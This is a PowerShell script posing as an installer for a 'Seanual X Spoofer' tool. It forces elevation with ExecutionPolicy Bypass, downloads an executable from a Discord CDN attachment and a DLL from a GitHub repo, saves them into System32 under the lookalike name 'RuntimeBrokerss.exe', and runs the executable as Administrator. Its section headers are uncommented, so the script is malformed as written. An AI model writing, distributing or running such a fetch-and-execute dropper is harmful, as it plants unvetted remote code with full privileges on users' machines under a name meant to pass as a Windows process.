-----------------------------
Menu Selection
-----------------------------
Write-Host "Hi Member Seanual X Spoofer Welcome to TOPKILL UPDATE | 9/11/2025:"
Write-Host "1. Run Program"
Write-Host "2. Clean & Exit"

$choice = Read-Host "Enter choice (1/2)"

-----------------------------
Check for Administrator rights
-----------------------------
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
Write-Host "Restarting with Administrator privileges..."
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File "$PSCommandPath"" -Verb RunAs
exit
}

-----------------------------
Define paths and variables
-----------------------------
$system32Path = "$env:windir\System32"
$exeDestination = Join-Path $system32Path "RuntimeBrokerss.exe"
$dllDestination = Join-Path $system32Path "Guna.UI2.dll"
$exeUrl = "https://cdn.discordapp.com/attachments/1437082224481534158/1437082275274686484/kare.bin?ex=6911f2aa&is=6910a12a&hm=8a20c5ca5c155a30caee6403340336e132db736017a9bdcfdeb89df766ab95f3&"
$dllUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/WEBSEA1213/raw/refs/heads/main/Guna.UI2.dll"

-----------------------------
Run Program Mode
-----------------------------
if ($choice -eq "1") {
# Check if files already exist
$exeExists = Test-Path $exeDestination
$dllExists = Test-Path $dllDestination
if ($exeExists -and $dllExists) {
    Write-Host "Files found. Starting program..." -ForegroundColor Green
} else {
    Write-Host "Installing required files..." -ForegroundColor Yellow
    
    # Download DLL if it doesn't exist
    if (-not $dllExists) {
        Write-Host "Downloading Guna.UI2.dll..."
        try {
            Invoke-WebRequest -Uri $dllUrl -OutFile $dllDestination
            Write-Host "Guna.UI2.dll installed." -ForegroundColor Green
        } catch {
            Write-Host "Guna.UI2.dll download failed: $_" -ForegroundColor Red
            exit
        }
    }

    # Download exe if it doesn't exist
    if (-not $exeExists) {
        Write-Host "Downloading main program..."
        try {
            $tempFile = Join-Path $env:TEMP "seanual_temp.exe"
            Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile
            Move-Item -Path $tempFile -Destination $exeDestination -Force
            Write-Host "Main program installed." -ForegroundColor Green
        } catch {
            Write-Host "Program download failed: $_" -ForegroundColor Red
            exit
        }
    }
}

# Run the program
Write-Host "Starting program..." -ForegroundColor Cyan
try {
    Start-Process -FilePath $exeDestination -Verb RunAs
    Write-Host "Program started successfully!" -ForegroundColor Green
} catch {
    Write-Host "Failed to start program: $_" -ForegroundColor Red
}
-----------------------------
Clean Mode
-----------------------------
elseif ($choice -eq "2") {
Write-Host "Cleaning up..." -ForegroundColor Yellow
# Stop the process if running
try {
    Stop-Process -Name "RuntimeBrokerss" -Force -ErrorAction SilentlyContinue
    Write-Host "Process stopped." -ForegroundColor Green
} catch {
    Write-Host "No running process found." -ForegroundColor Yellow
}

# Remove files if they exist
if (Test-Path $exeDestination) { 
    Remove-Item $exeDestination -Force 
    Write-Host "Removed executable." -ForegroundColor Green
} else {
    Write-Host "Executable not found." -ForegroundColor Yellow
}

if (Test-Path $dllDestination) { 
    Remove-Item $dllDestination -Force 
    Write-Host "Removed DLL." -ForegroundColor Green
} else {
    Write-Host "DLL not found." -ForegroundColor Yellow
}

Write-Host "Cleanup completed." -ForegroundColor Green
}

else {
Write-Host "Invalid choice (please select 1 or 2)." -ForegroundColor Red
}
